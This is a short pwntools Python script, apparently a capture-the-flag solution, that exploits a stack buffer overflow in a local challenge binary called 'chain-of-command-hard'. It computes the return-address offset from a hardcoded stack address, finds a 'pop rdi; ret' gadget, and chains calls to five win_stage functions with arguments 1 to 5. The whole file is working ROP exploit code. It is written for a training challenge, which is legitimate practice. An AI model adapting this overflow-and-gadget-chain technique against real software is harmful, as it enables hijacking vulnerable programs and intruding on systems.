#!/usr/bin/python3


from pwn import *


context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/chain-of-command-hard')
rop = ROP(elf)

rbp = 0x7ffd559d6330
input_start = rbp - 0x30
ret = rbp + 0x8
offset = ret - input_start

pop_rdi = rop.find_gadget(["pop rdi","ret"]).address

payload = b"A" * offset 
payload += p64(pop_rdi) + p64(1) + p64(elf.sym.win_stage_1)
payload += p64(pop_rdi) + p64(2) + p64(elf.sym.win_stage_2)
payload += p64(pop_rdi) + p64(3) + p64(elf.sym.win_stage_3)
payload += p64(pop_rdi) + p64(4) + p64(elf.sym.win_stage_4)
payload += p64(pop_rdi) + p64(5) + p64(elf.sym.win_stage_5)

io = process()

io.send(payload)

io.interactive()
